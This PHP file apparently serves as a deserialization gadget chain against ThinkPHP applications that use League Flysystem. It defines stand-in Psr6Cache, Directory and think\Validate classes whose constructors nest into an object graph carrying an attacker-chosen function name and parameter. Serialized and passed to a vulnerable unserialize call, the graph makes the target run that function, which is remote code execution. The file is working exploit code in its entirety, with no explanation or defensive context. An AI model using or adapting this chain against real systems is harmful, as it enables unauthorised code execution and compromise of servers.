<?php

namespace League\Flysystem\Cached\Storage
{
    class Psr6Cache
    {
        private $pool;
        protected $autosave;
        protected $key;

        function __construct($function, $parameter)
        {
            $this->autosave = false;
            $this->pool = new \League\Flysystem\Directory(0, $function, $parameter);
            $this->key = ["anything"];
        }
    }
}

namespace League\Flysystem
{
    class Directory
    {
        protected $filesystem;
        protected $path;

        function __construct($id, $function, $parameter)
        {
            if ($id == 0)
            {
                $this->filesystem = new \League\Flysystem\Directory(1, $function, $parameter);
                $this->path = "key";
            }
            else
            {
                $this->filesystem = new \think\Validate($function);
                $this->path = $parameter;
            }
        }
    }
}

namespace think
{
    class Validate
    {
        protected $type;

        function __construct($function)
        {
            $this->type = ["key" => $function];
        }
    }
}
